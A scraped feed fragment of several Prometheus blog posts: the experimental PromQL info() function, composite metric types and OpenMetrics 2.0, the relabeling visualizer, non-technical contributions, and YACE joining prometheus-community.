<a href=\"https://github.com/prometheus/prometheus/issues/17914\">stateset</a> to fully eliminate classic model for all composite types. Feel free to join and help on that work!</p>\n</li>\n<li>\n<p>We are working on <a href=\"https://docs.google.com/document/d/1FCD-38Xz1-9b3ExgHOeDTQUKUatzgj5KbCND9t-abZY/edit?tab=t.lvx6fags1fga#heading=h.uaaplxxbz60u\">the OpenMetrics 2.0</a> to consolidate and improve the pull protocol scene and apply the new learnings. One of the core changes will be the move to <a href=\"https://github.com/prometheus/docs/pull/2679\">composite values in text</a>, which makes the text format trivial to parse for storages that support composite types natively. This solves the <strong>combining</strong> challenge. Note that, by default, for now, all composite types will be still \"expanded\" to classic format on scrape, so there's no breaking change for users. Feel free to join our WG to help or give feedback.</p>\n</li>\n<li>\n<p>Prometheus receive and export protocol has been updated. <a href=\"https://prometheus.io/docs/specs/prw/remote_write_spec_2_0/\">Remote Write 2.0</a> allows transporting histograms in the \"native\" form instead of a classic representation (classic one is still supported). In the future versions (e.g. 2.1), we could easily follow a similar pattern and add native summaries and stateset. Contributions are welcome to <a href=\"https://github.com/prometheus/prometheus/issues/16944\">make Remote Write 2.0 stable</a>!</p>\n</li>\n<li>\n<p>We are experimenting with the <strong>consumption</strong> compatibility modes that translate the composite types store as composite samples to classic representation. This is not trivial; there are edge cases, but it might be more feasible (and needed!) than we might have initially anticipated. See:</p>\n<ul>\n<li><a href=\"https://github.com/prometheus/prometheus/issues/16948\">PromQL compatibility mode for NHCB</a></li>\n<li><a href=\"https://github.com/prometheus/prometheus/issues/17147\">Expanding on remote write</a></li>\n<li>We need to also consider adding expanding for federation, remote read and other APIs.</li>\n</ul>\n<p>In PromQL it might work as follows, for an NHCB that used to be a classic histogram:</p>\n<pre><code># New syntax gives our \"foo\" NHCB:    \nhistogram_quantile(0.9, sum(foo{job=\"a\"}))\n# Old syntax still works, expanding \"foo\" NHCB to classic representation:\nhistogram_quantile(0.9, sum(foo_bucket{job=\"a\"}) by (le))\n</code></pre>\n<p>Alternatives, like <a href=\"https://github.com/prometheus/OpenMetrics/issues/312#issuecomment-3884502409\">a special label or annotations</a>, are also discussed.</p>\n</li>\n</ol>\n<p>When implemented, it should be possible to fully switch different parts of your metric collection pipeline to native form <strong>transparently</strong>.</p>\n<h2>Summary</h2>\n<p>Moving Prometheus to a native composite type world is not easy and will take time, especially around coding, testing and optimizing. Notably it switches performance characteristics of the metric load from uniform, predictable sample sizes to a sample size that depends on a type. Another challenge is code architecture - maintaining different sample types has already proven to be very verbose (we <a href=\"https://github.com/prometheus/prometheus/issues/17925\">need unions, Go!</a>).</p>\n<p>However, recent work revealed a very clean and <strong>possible</strong> path that yields clear benefits around functionality, transactionality, reliability, and efficiency in the relatively near future, which is pretty exciting!</p>\n<p>If you have any questions around these changes, feel free to:</p>\n<ul>\n<li>DM me on Slack.</li>\n<li>Visit the <code>#prometheus-dev</code> Slack channel and share your questions.</li>\n<li>Comment on related issues, create PRs, also <strong>review</strong> PRs (the most impactful work!)</li>\n</ul>\n<p>The Prometheus community is also at KubeConEU 2026 in Amsterdam!

      "summary": "<p>Enriching metrics with metadata labels can be surprisingly tricky in Prometheus, even if you're a PromQL wiz!\nThe PromQL join query traditionally used for this is inherently quite complex because it has to specify the labels to join on, the info metric to join with, and the labels to enrich with.\nThe new, still experimental <code>info()</code> function, promises a simpler way, making label enrichment as simple as wrapping your query in a single function call.</p>\n<p>In Prometheus 3.0, we introduced the <a href=\"https://prometheus.io/docs/prometheus/latest/querying/functions/#info\"><code>info()</code></a> function, a powerful new way to enrich your time series with labels from info metrics.\nWhat's special about <code>info()</code> versus the traditional join query technique is that it relieves you from having to specify <em>identifying labels</em>, which info metric(s) to join with, and the (\"data\" or \"non-identifying\") labels to enrich with.\nNote that \"identifying labels\" in this particular context refers to the set of labels that identify the info metrics in question, and are shared with associated non-info metrics.\nThey are the labels you would join on in a Prometheus <a href=\"https://grafana.com/blog/2021/08/04/how-to-use-promql-joins-for-more-effective-queries-of-prometheus-metrics-at-scale\">join query</a>.\nConceptually, they can be compared to <a href=\"https://en.wikipedia.org/wiki/Foreign_key\">foreign keys</a> in relational databases.</p>\n<p>Beyond the main functionality, <code>info()</code> also solves a subtle yet critical problem that has plagued join queries for years: The \"churn problem\" that causes queries to fail when non-identifying info metric labels change, combined with missing staleness marking (as is the case with OTLP ingestion).</p>\n<p>Whether you're working with OpenTelemetry resource attributes, Kubernetes labels, or any other metadata, the <code>info()</code> function makes your PromQL queries cleaner, more reliable, and easier to understand.</p>\n<h2>The Problem: Complex Joins and The Churn Problem</h2>\n<p>Let us start by looking at what we have had to do until now.\nImagine you're monitoring HTTP request durations via OpenTelemetry and want to break them down by Kubernetes cluster.\nYou push your metrics to Prometheus' OTLP endpoint.\nYour metrics have <code>job</code> and <code>instance</code> labels, but the cluster name lives in a separate <code>target_info</code> metric, as the <code>k8s_cluster_name</code> label.\nHere's what the traditional approach looks like:</p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n    rate(http_server_request_duration_seconds_count[2m])\n  * on (job, instance) group_left (k8s_cluster_name)\n    target_info\n)\n</code></pre>\n<p>While this works, there are several issues:</p>\n<p><strong>1. Complexity:</strong> You need to know:</p>\n<ul>\n<li>Which info metric contains your labels (<code>target_info</code>)</li>\n<li>Which labels are the \"identifying\" labels to join on (<code>job</code>, <code>instance</code>)</li>\n<li>Which data labels you want to add (<code>k8s_cluster_name</code>)</li>\n<li>The proper PromQL join syntax (<code>on</code>, <code>group_left</code>)</li>\n</ul>\n<p>This requires expert-level PromQL knowledge and makes queries harder to read and maintain.</p>\n<p><strong>2. The Churn Problem (The Critical Issue):</strong></p>\n<p>Here's the subtle but serious problem: What happens when an OTel resource attribute changes in a Kubernetes container, while the identifying resource attributes stay the same?\nAn example could be the resource attribute <code>k8s.pod.labels.app.kubernetes.io/version</code>.\nThen the corresponding <code>target_info</code> label <code>k8s_pod_labels_app_kubernetes_io_version</code> changes, and Prometheus sees a completely new <code>target_info</code> time series.</p>\n<p>As the OTLP endpoint doesn't mark the old <code>target_info</code> series as stale, both the old and new series can exist simultaneously for up to 5 minutes (the default lookback delta).\nDuring this overlap period, your join query finds <strong>two distinct matching <code>target_info</code> time series</strong> and fails with a \"many-to-many matching\" error.</p>\n<p>This could in practice mean your dashboards break and your alerts stop firing when infrastructure changes are happening, perhaps precisely when you would need visibility the most.</p>\n<h3>The Info Function Presents a Solution</h3>\n<p>The previous join query can be converted to use the <code>info</code> function as follows:</p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n  info(rate(http_server_request_duration_seconds_count[2m]))\n)\n</code></pre>\n<p>Much more comprehensible, isn't it?\nAs regards solving the churn problem, the real magic happens under the hood: <strong><code>info()</code> automatically selects the time series with the latest sample</strong>, eliminating churn-related join failures entirely.\nNote that this call to <code>info()</code> returns all data labels from <code>target_info</code>, but it doesn't matter because we aggregate them away with <code>sum</code>.</p>\n<h2>Basic Syntax</h2>\n<pre><code class=\"language-promql\">info(v instant-vector, [data-label-selector instant-vector])\n</code></pre>\n<ul>\n<li><strong><code>v</code></strong>: The instant vector to enrich with metadata labels</li>\n<li><strong><code>data-label-selector</code></strong> (optional): Label matchers in curly braces to filter which labels to include</li>\n</ul>\n<p>In its most basic form, omitting the second parameter, <code>info()</code> adds <strong>all</strong> data labels from <code>target_info</code>:</p>\n<pre><code class=\"language-promql\">info(rate(http_server_request_duration_seconds_count[2m]))\n</code></pre>\n<p>Through the second parameter on the other hand, you can control which data labels to include from <code>target_info</code>:</p>\n<pre><code class=\"language-promql\">info(\n  rate(http_server_request_duration_seconds_count[2m]),\n  {k8s_cluster_name=~\".+\"}\n)\n</code></pre>\n<p>In the example above, <code>info()</code> includes the <code>k8s_cluster_name</code> data label from <code>target_info</code>.\nBecause the selector matches any non-empty string, it will include any <code>k8s_cluster_name</code> label value.</p>\n<p>It's also possible to filter which <code>k8s_cluster_name</code> label values to include:</p>\n<pre><code class=\"language-promql\">info(\n  rate(http_server_request_duration_seconds_count[2m]),\n  {k8s_cluster_name=\"us-east-0\"}\n)\n</code></pre>\n<h2>Selecting Different Info Metrics</h2>\n<p>By default, <code>info()</code> uses the <code>target_info</code> metric.\nHowever, you can select different info metrics (like <code>build_info</code> or <code>node_uname_info</code>) by including a <code>__name__</code> matcher in the data-label-selector:</p>\n<pre><code class=\"language-promql\"># Use build_info instead of target_info\ninfo(up, {__name__=\"build_info\"})\n\n# Use multiple info metrics (combines labels from both)\ninfo(up, {__name__=~\"(target|build)_info\"})\n\n# Select build_info and only include the version label\ninfo(up, {__name__=\"build_info\", version=~\".+\"})\n</code></pre>\n<p><strong>Note:</strong> The current implementation always uses <code>job</code> and <code>instance</code> as the identifying labels for joining, regardless of which info metric you select.\nThis works well for most standard info metrics but may have limitations with custom info metrics that use different identifying labels.\nAn example of an info metric that has different identifying labels than <code>job</code> and <code>instance</code> is <code>kube_pod_labels</code>, its identifying labels are instead: <code>namespace</code> and <code>pod</code>.\nThe intention is that <code>info()</code> in the future knows which metrics in the TSDB are info metrics and automatically uses all of them, unless the selection is explicitly restricted by a name matcher like the above, and which are the identifying labels for each info metric.</p>\n<h2>Real-World Use Cases</h2>\n<h3>OpenTelemetry Integration</h3>\n<p>The primary driver for the <code>info()</code> function is <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">OpenTelemetry</a> (OTel) integration.\nWhen using Prometheus as an OTel backend, resource attributes (metadata about the metrics producer) are automatically converted to the <code>target_info</code> metric:</p>\n<ul>\n<li><code>service.instance.id</code> → <code>instance</code> label</li>\n<li><code>service.name</code> → <code>job</code> label</li>\n<li><code>service.namespace</code> → prefixed to <code>job</code> (i.e., <code>&#x3c;namespace>/&#x3c;service.name></code>)</li>\n<li>All other resource attributes → data labels on <code>target_info</code></li>\n</ul>\n<p>This means that, so long as at least either the <code>service.instance.id</code> or the <code>service.name</code> resource attribute is included, every OTel metric you send to Prometheus over OTLP can be enriched with resource attributes using <code>info()</code>:</p>\n<pre><code class=\"language-promql\"># Add all OTel resource attributes\ninfo(rate(http_server_request_duration_seconds_sum[5m]))\n\n# Add only specific attributes\ninfo(\n  rate(http_server_request_duration_seconds_sum[5m]),\n  {k8s_cluster_name=~\".+\", k8s_namespace_name=~\".+\", k8s_pod_name=~\".+\"}\n)\n</code></pre>\n<h3>Build Information</h3>\n<p>Enrich your metrics with build-time information:</p>\n<pre><code class=\"language-promql\"># Add version and branch information to request rates\nsum by (job, http_status_code, version, branch) (\n  info(\n    rate(http_server_request_duration_seconds_count[2m]),\n    {__name__=\"build_info\"}\n  )\n)\n</code></pre>\n<h3>Filter on Producer Version</h3>\n<p>Pick only metrics from certain producer versions:</p>\n<pre><code class=\"language-promql\">sum by (job, http_status_code, version) (\n  info(\n    rate(http_server_request_duration_seconds_count[2m]),\n    {__name__=\"build_info\", version=~\"2\\\\..+\"}\n  )\n)\n</code></pre>\n<h2>Before and After: Side-by-Side Comparison</h2>\n<p>Let's see how the <code>info()</code> function simplifies real queries:</p>\n<h3>Example 1: OpenTelemetry Resource Attribute Enrichment</h3>\n<p><strong>Traditional approach:</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name, k8s_namespace_name, k8s_container_name) (\n    rate(http_server_request_duration_seconds_count[2m])\n  * on (job, instance) group_left (k8s_cluster_name, k8s_namespace_name, k8s_container_name)\n    target_info\n)\n</code></pre>\n<p><strong>With info():</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name, k8s_namespace_name, k8s_container_name) (\n  info(rate(http_server_request_duration_seconds_count[2m]))\n)\n</code></pre>\n<p>The intent is much clearer with <code>info</code>: We're enriching <code>http_server_request_duration_seconds_count</code> with Kubernetes related OpenTelemetry resource attributes.</p>\n<h3>Example 2: Filtering by Label Value</h3>\n<p><strong>Traditional approach:</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n    rate(http_server_request_duration_seconds_count[2m])\n  * on (job, instance) group_left (k8s_cluster_name)\n    target_info{k8s_cluster_name=~\"us-.*\"}\n)\n</code></pre>\n<p><strong>With info():</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n  info(\n    rate(http_server_request_duration_seconds_count[2m]),\n    {k8s_cluster_name=~\"us-.*\"}\n  )\n)\n</code></pre>\n<p>Here we filter to only include metrics from clusters in the US (which names start with <code>us-</code>). The <code>info()</code> version integrates the filter naturally into the data-label-selector.</p>\n<h2>Technical Benefits</h2>\n<p>Beyond the fundamental UX benefits, the <code>info()</code> function provides several technical advantages:</p>\n<h3>1. Automatic Churn Handling</h3>\n<p>As previously mentioned, <code>info()</code> automatically picks the matching info time series with the latest sample when multiple versions exist.\nThis eliminates the \"many-to-many matching\" errors that plague traditional join queries during churn.</p>\n<p><strong>How it works:</strong> When non-identifying info metric labels change (e.g., a pod is re-created), there's a brief period where both old and new series might exist.\nThe <code>info()</code> function simply selects whichever has the most recent sample, ensuring your queries keep working.</p>\n<h3>2. Better Performance</h3>\n<p>The <code>info()</code> function is more efficient than traditional joins:</p>\n<ul>\n<li>Only selects matching info series</li>\n<li>Avoids unnecessary label matching operations</li>\n<li>Optimized query execution path</li>\n</ul>\n<h2>Getting Started</h2>\n<p>The <code>info()</code> function is experimental and must be enabled via a feature flag:</p>\n<pre><code class=\"language-bash\">prometheus --enable-feature=promql-experimental-functions\n</code></pre>\n<p>Once enabled, you can start using it immediately.</p>\n<h2>Current Limitations and Future Plans</h2>\n<p>The current implementation is an <strong>MVP (Minimum Viable Product)</strong> designed to validate the approach and gather user feedback.\nThe implementation has some intentional limitations:</p>\n<h3>Current Constraints</h3>\n<ol>\n<li>\n<p><strong>Default info metric:</strong> Only considers <code>target_info</code> by default</p>\n<ul>\n<li>Workaround: You can use <code>__name__</code> matchers like <code>{__name__=~\"(target|build)_info\"}</code> in the data-label-selector, though this still assumes <code>job</code> and <code>instance</code> as identifying labels</li>\n</ul>\n</li>\n<li>\n<p><strong>Fixed identifying labels:</strong> Always assumes <code>job</code> and <code>instance</code> are the identifying labels for joining</p>\n<ul>\n<li>This unfortunately makes <code>info()</code> unsuitable for certain scenarios, e.g. including data labels from <code>kube_pod_labels</code>, but it's a problem we want to solve in the future</li>\n</ul>\n</li>\n</ol>\n<h3>Future Development</h3>\n<p>These limitations are meant to be temporary.\nThe experimental status allows us to:</p>\n<ul>\n<li>Gather real-world usage feedback</li>\n<li>Understand which use cases matter the most</li>\n<li>Iterate on the design before committing to a final API</li>\n</ul>\n<p>A future version of the <code>info()</code> function should:</p>\n<ul>\n<li>Consider all info metrics by default (not just <code>target_info</code>)</li>\n<li>Automatically understand identifying labels based on info metric metadata</li>\n</ul>\n<p><strong>Important:</strong> Because this is an experimental feature, the behavior may change in future Prometheus versions, or the function could potentially be removed from PromQL entirely based on user feedback.</p>\n<h2>Giving Feedback</h2>\n<p>Your feedback will directly shape the future of this feature and help us determine whether it should become a permanent part of PromQL.\nFeedback may be provided e.g. through our <a href=\"https://prometheus.io/community/#community-connections\">community connections</a> or by opening a <a href=\"https://github.com/prometheus/prometheus/issues\">Prometheus issue</a>.</p>\n<p>We encourage you to try the <code>info()</code> function and share your feedback:</p>\n<ul>\n<li>What use cases does it solve for you?</li>\n<li>What additional functionality would you like to see?</li>\n<li>How could the API be improved?</li>\n<li>Do you see improved performance?</li>\n</ul>\n<h2>Conclusion</h2>\n<p>The experimental <code>info()</code> function represents a significant step forward in making PromQL more accessible and reliable.\nBy simplifying metadata label enrichment and automatically handling the churn problem, it removes two major pain points for Prometheus users, especially those adopting OpenTelemetry.</p>\n<p>To learn more:</p>\n<ul>\n<li><a href=\"https://prometheus.io/docs/prometheus/latest/querying/functions/#info\">PromQL functions documentation</a></li>\n<li><a href=\"https://prometheus.io/docs/guides/opentelemetry/\">OpenTelemetry guide (includes detailed info() usage)</a></li>\n<li><a href=\"https://github.com/prometheus/proposals/blob/main/proposals/0037-native-support-for-info-metrics-metadata.md\">Feature proposal</a></li>\n</ul>\n<p>Please feel welcome to share your thoughts with the Prometheus community on <a href=\"https://github.com/prometheus/prometheus/discussions\">GitHub Discussions</a> or get in touch with us on the <a href=\"https://cloud-native.slack.com/\">CNCF Slack #prometheus channel</a>.</p>\n<p>Happy querying!</p>",

      "summary": "<p>Prometheus' <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#relabel_config\">target relabeling</a> feature allows you to adjust the labels of a discovered target or even drop the target entirely. Relabeling rules, while powerful, can be hard to understand and debug. Your rules have to match the expected labels that your service discovery mechanism returns, and getting any step wrong could label your target incorrectly or accidentally drop it.</p>\n<p>To help you figure out where things go wrong (or right), Prometheus 3.8.0 <a href=\"https://github.com/prometheus/prometheus/pull/17337\">just added a relabeling visualizer</a> to the Prometheus server's web UI that allows you to inspect how each relabeling rule is applied to a discovered target's labels. Let's take a look at how it works!</p>\n<h2>Using the relabeling visualizer</h2>\n<p>If you head to any Prometheus server's \"Service discovery\" page (for example: <a href=\"https://demo.promlabs.com/service-discovery\">https://demo.promlabs.com/service-discovery</a>), you will now see a new \"show relabeling\" button for each discovered target:</p>\n<p><img alt=\"Service discovery page screenshot\" src=\"https://prometheus.io/assets/blog/2025-12-02/prometheus-sd-page-show-relabeling.png\" /></p>\n<p>Clicking this button shows you how each relabeling rule is applied to that particular target in sequence:</p>\n<p>The visualizer shows you:</p>\n<ul>\n<li>The <strong>initial labels</strong> of the target as discovered by the service discovery mechanism.</li>\n<li>The details of <strong>each relabeling rule</strong>, including its action type and other parameters.</li>\n<li><strong>How the labels change</strong> after each relabeling rule is applied, with changes, additions, and deletions highlighted in color.</li>\n<li>Whether the target is ultimately <strong>kept or dropped</strong> after all relabeling rules have been applied.</li>\n<li>The <strong>final output labels</strong> of the target if it is kept.</li>\n</ul>\n<p>To debug your relabeling rules, you can now read this diagram from top to bottom and find the exact step where the labels change in an unexpected way or where the target gets dropped.

      "summary": "<p>My first introduction to the Prometheus project was through the\n<a href=\"https://mentorship.lfx.linuxfoundation.org/project/36e3f336-ce78-4074-b833-012015eb59be\">Linux Foundation mentorship program</a>,\nwhere I conducted UX research. I remember the anxiety I felt when I was selected as a mentee. I was new not just to Prometheus,\nbut to observability entirely. I worried I was in over my head, working in a heavily developer-focused domain with no development background.</p>\n<p>That anxiety turned out to be unfounded. I went on to make meaningful contributions to the project, and I've learned that what I\nexperienced is nearly universal among non-technical contributors to open source.</p>\n<p>If you're feeling that same uncertainty, this post is for you. I'll share the challenges you're likely to face (or already face),\nwhy your contributions matter, and how to find your place in the Prometheus community.</p>\n<h2>The Challenges Non-Technical Contributors Face</h2>\n<p>As a non-technical contributor, I've had my share of obstacles in open source. And from conversations with others navigating these spaces,\nI've found the struggles are remarkably consistent. Here are the most common barriers:</p>\n<h3>1. The Technical Intimidation Factor</h3>\n<p>I've felt out of place in open source spaces, mostly because technical contributors vastly outnumber non-technical ones. Even the non-technical\npeople often have technical backgrounds or have been around long enough to understand what's happening.</p>\n<p>When every conversation references concepts you don't know, it's easy to feel intimidated. You join meetings and stay silent throughout.\nYou respond in the chat instead of unmuting because you don't trust yourself to speak up in a recorded meeting where everyone else seems\nfluent in a technical language you're still learning.</p>\n<h3>2. Unclear Value Proposition</h3>\n<p>Open source projects rarely spell out their non-technical needs the way a job posting would. You would hardly find an issue titled\n\"Need: someone to interview users and write case studies\" or \"Wanted: community manager to organize monthly meetups.\" Instead, you’re\nmore likely to see a backlog of GitHub issues about bugs, feature requests, and code refactoring.</p>\n<p>Even if you have valuable skills, you don't know where they're needed, how to articulate your value, or whether your contributions will\nbe seen as mission-critical or just nice-to-have. Without a clear sense of how you fit in, it's difficult to reach out confidently.\nYou end up sending vague messages like \"I'd love to help! Let me know if there's anything I can do\", which rarely leads anywhere because\nmaintainers are busy and don't have time to figure out how to match your skills to their needs.</p>\n<h3>3. Lack of Visible Non-Technical Contributors</h3>\n<p>One of the things that draws me to an open source community or project is finding other people like me. I think it's the same way for most people.\nRepresentation matters. It's hard to be what you can't see.</p>\n<p>It’s even more difficult to find non-technical contributors because their contributions are often invisible in the ways projects typically showcase work.\nGitHub contribution graphs count commits. Changelogs list code changes and bug fixes. You only get the \"contributor\" label when you've created a\npull request that got merged. So, even when people are organizing events, supporting users, or conducting research, their work doesn't show up in\nthe same prominent ways code does.</p>\n<h3>4. The Onboarding Gap</h3>\n<p>A typical \"Contributing Guide\" will walk you through setting up a development environment, creating a branch, running tests, and submitting a pull request.\nBut it rarely explains how to contribute documentation improvements, where design feedback should go, or how community support is organized.</p>\n<p>You see \"Join our community\" with a link to a Slack workspace. But between joining and making your first contribution, there's a significant gap.\nThere are hundreds of people in dozens of channels. Who's a maintainer and who's just another community member? Which channel is appropriate for\nyour questions? Who should you tag when you need guidance?</p>\n<h2>Why These Gaps Exist</h2>\n<p>It's worth acknowledging that most of the time, these gaps aren't intentional. Projects don't set out to exclude non-technical contributors or\nmake it harder for them to participate.</p>\n<p>In most cases, a small group of developers build something useful and decide to open-source it. They invite people they know who might need it\n(often other developers) to contribute. The project grows organically within those networks. It becomes a community of developers building\ntools for developers, and certain functions simply don't feel necessary yet. Marketing? The word spreads naturally through tech circles.\nCommunity management? The community is small and self-organizing. UX design? They're developers comfortable with command-line interfaces,\nso they may not fully consider the experience of using a graphical interface.</p>\n<p>None of this is malicious. It's just that the project evolved in a context where those skills weren't obviously needed.</p>\n<p>The shift happens when someone, often a non-technical contributor who sees the potential, steps in and says:\n\"You've built something valuable and grown an impressive community. But here's what you might be missing.\nHere's how documentation could lower the barrier to entry. Here's how community management could retain contributors.\nHere's how user research could guide your roadmap.\"</p>\n<h2>Why Non-Technical Contributions Matter</h2>\n<p>Prometheus is a powerful monitoring system backed by a large community of developers. But like any open source project, it needs more than code to thrive.</p>\n<p><strong>It needs accessible documentation.</strong> From my experience working with engineers, most would rather focus on building than writing docs,\nand understandably so. Engineers who know the system inside out often write documentation that assumes knowledge newcomers don't have.\nWhat makes perfect sense to someone who built the feature can feel impenetrable to someone encountering it for the first time.\nA technical writer testing the product from an end user's perspective, not a builder's, can bridge that gap and lower the barrier to entry.</p>\n<p><strong>It needs organization.</strong> The GitHub issues backlog has hundreds of open items that haven't been triaged. Maintainers spend valuable\ntime parsing what users actually need instead of building solutions. A project manager or someone with triage experience could turn\nthat chaos into a clear roadmap, allowing maintainers to spend their time building solutions.</p>\n<p><strong>It needs community support.</strong> Imagine a user who joins the Slack workspace, excited to contribute. They don't know where to start.\nThey ask a question that gets buried in the stream of messages. They quietly leave. The project just lost a potential contributor because\nno one was there to welcome them and point them in the right direction.</p>\n<p>These are the situations non-technical contributions can help prevent. Good documentation lowers the barrier to entry, which means more adoption,\nmore feedback, and better features. Active community management retains contributors who would otherwise drift away, which means distributed\nknowledge and less maintainer burnout. Organization and triage turn scattered input into actionable priorities.</p>\n<p>The Prometheus maintainers are doing exceptional work building a robust, scalable monitoring system. But they can't do everything,\nand they shouldn't have to. The question now isn't whether non-technical contributions matter. It's whether we create the space for them to happen.</p>\n<h2>Practical Ways You Can Contribute to Prometheus</h2>\n<p>If you're ready to contribute to Prometheus but aren't sure where to start, here are some areas where non-technical skills are actively needed.</p>\n<h3>1. Join the UX Efforts</h3>\n<p>Prometheus is actively working to improve its user experience, and the community now has a\n<a href=\"https://cloud-native.slack.com/archives/C09NL3B1EKW\">UX Working Group</a> dedicated to this effort.</p>\n<p>If you're a UX researcher, designer, or someone with an eye for usability, this is an excellent time to get involved.\nThe working group is still taking shape, with ongoing discussions about priorities and processes.\nJoin the Slack channel to participate in these conversations and watch for upcoming announcements about specific ways to contribute.</p>\n<p>I can tell you from experience that the community is receptive to UX contributions, and your work will have a real impact.</p>\n<h3>2. Write for the Prometheus Blog</h3>\n<p>If you're a technical writer or content creator, the Prometheus blog is a natural entry point. The blog publishes tutorials,\ncase studies, best practices, community updates, and generally, content that helps users get more value from Prometheus.</p>\n<p>Check out the <a href=\"https://github.com/prometheus/docs/blob/main/blog/README.md\">blog content guide</a> to understand what makes a strong blog proposal and how to publish a post on the blog.\nThere's an audience eager to learn from your experience.</p>\n<h3>3. Improve and Maintain Documentation</h3>\n<p>Documentation is one of those perpetual needs in open source. There's always something that could be clearer, more complete, or better organized.\nThe Prometheus docs repo is no exception.</p>\n<p>You can contribute by fixing typos and <a href=\"https://github.com/prometheus/docs/issues/2649\">broken links</a>, expanding getting-started guides,\ncreating tutorials for common monitoring scenarios, or <a href=\"https://www.youtube.com/watch?v=SzSUa5y7Ji0&#x26;t=27105s\">triaging issues</a> to help\nprioritize what needs attention. Even if you don't consider yourself a technical writer, if you've ever been confused by the docs and\nfigured something out, you can help make it clearer for the next person.</p>\n<h3>4. Help Organize PromCon</h3>\n<p><a href=\"https://promcon.io/\">PromCon</a> is Prometheus's annual conference, and it takes significant coordination to pull off.\nThe organizing team handles everything from speaker selection and scheduling to venue logistics and sponsor relationships.</p>\n<p>If you have experience in event planning, sponsor outreach, marketing, or communications, the PromCon organizers would welcome your help.\nReach out to the <a href=\"mailto:promcon-organizers@googlegroups.com\">organizing team</a> or watch for announcements in the Prometheus community channels.</p>\n<h3>5. Advocate and Amplify</h3>\n<p>Finally, one of the simplest but most impactful things you can do is talk about Prometheus. Write blog posts about how you're using Prometheus.\nGive talks at local meetups or conferences. Share tips and learnings on social media. Create video tutorials or live streams.\nRecommend Prometheus to teams evaluating monitoring solutions.</p>\n<p>Every piece of content, every conference talk, every social media post expands Prometheus's reach and helps new users discover it.</p>\n<h2>How to Get Started</h2>\n<p>If you're ready to contribute to Prometheus, here's what I've learned from my own experience navigating the community as a non-technical contributor:</p>\n<p><strong>Start by introducing yourself.</strong> When you join the #prometheus-dev Slack channel, say hello. Slack doesn't always make it obvious\nwhen someone new joins, so if you stay silent, people simply won't know you're there. A simple introduction—your name, what you do, what brought you to Prometheus—is enough to make your presence known.</p>\n<p><strong>Attend community meetings.</strong> Check out the <a href=\"https://prometheus.io/community/#calendar-for-public-events\">community calendar</a> and\nsync the meetings that interest you. Even if you don't understand everything being discussed at first (and that's completely normal), stay.\nThe more you sit in, the more you'll learn about the community's needs and find more opportunities to contribute.</p>\n<p><strong>Observe before you act.</strong> It's tempting to jump in with ideas immediately, but spending time as an observer first pays off.\nRead through Slack discussions and conversations in GitHub issues. Browse the documentation. Notice what kinds of contributions are being made.\nYou'll start to see patterns: recurring questions, documentation gaps, areas where help is needed. That's where your opportunity lies.</p>\n<p><strong>Ask questions.</strong> Everyone was new once. If something isn't clear, ask. If you don't get a response right away,\ngive it some time—people are busy—then follow up. The community is welcoming, but you have to make yourself visible.</p>\n<p>The Prometheus community has room for you. Now you know exactly where to begin.</p>",

This move will make it more accessible to users and open new opportunities for contributors to enhance and maintain the project. There's also a blog post from <a href=\"https://grafana.com/blog/2024/11/19/yace-moves-to-prometheus-community/\">Cristian Greco's point of view</a>.</p>\n<h2>The early days</h2>\n<p>When I first started YACE, I had no idea it would grow to this scale. At the time, I was working with <a href=\"https://www.ivx.com\">Invision AG</a> (not to be confused with the design app), a company focused on workforce management software. They fully supported me in open-sourcing the tool, and with the help of my teammate <a href=\"https://github.com/kforsthoevel\">Kai Forsthövel</a>, YACE was brought to life.</p>\n<p>Our first commit was back in 2018, with one of our primary goals being to make CloudWatch metrics easy to scale and automatically detect what to measure, all while keeping the user experience simple and intuitive. InVision AG was scaling their infrastructure up and down due to machine learning workloads and we needed something that detects new infrastructure easily. This focus on simplicity has remained a core priority. From that point on, YACE began to find its audience.</p>\n<h2>Yace Gains Momentum</h2>\n<p>As YACE expanded, so did the support around it. One pivotal moment was when <a href=\"https://github.com/cristiangreco\">Cristian Greco</a> from Grafana Labs reached out. I was feeling overwhelmed and hardly keeping up when Cristian stepped in, simply asking where he could help. He quickly became the main releaser and led Grafana Labs' contributions to YACE, a turning point that made a huge impact on the project. Along with an incredible community of contributors from all over the world, they elevated YACE beyond what I could have achieved alone, shaping it into a truly global tool. YACE is no longer just my project or Invision's—it belongs to the community.</p>\n<h2>Gratitude and Future Vision</h2>\n<p>I am immensely grateful to every developer, tester, and user who has contributed to YACE's success. This journey has shown me the power of community and open source collaboration. But we're not done yet.</p>\n<p>It's time to take Yace even further—into the heart of the Prometheus ecosystem. Making Yace as the official Amazon CloudWatch exporter for Prometheus will make it easier and more accessible for everyone. With ongoing support from Grafana Labs and my commitment to refining the user experience, we'll ensure YACE becomes an intuitive tool that anyone can use effortlessly.</p>\n<h2>Try out YACE on your own</h2>\n<p>Try out <strong><a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter\">YACE (Yet Another CloudWatch Exporter)</a></strong> by following our step-by-step <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/blob/master/docs/installation.md\">Installation Guide</a>.</p>\n<p>You can explore various configuration examples <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/tree/master/examples\">here</a> to get started with monitoring specific AWS services.</p>\n<p>Our goal is to enable easy auto-discovery across all AWS services, making it simple to monitor any dynamic infrastructure.</p>",

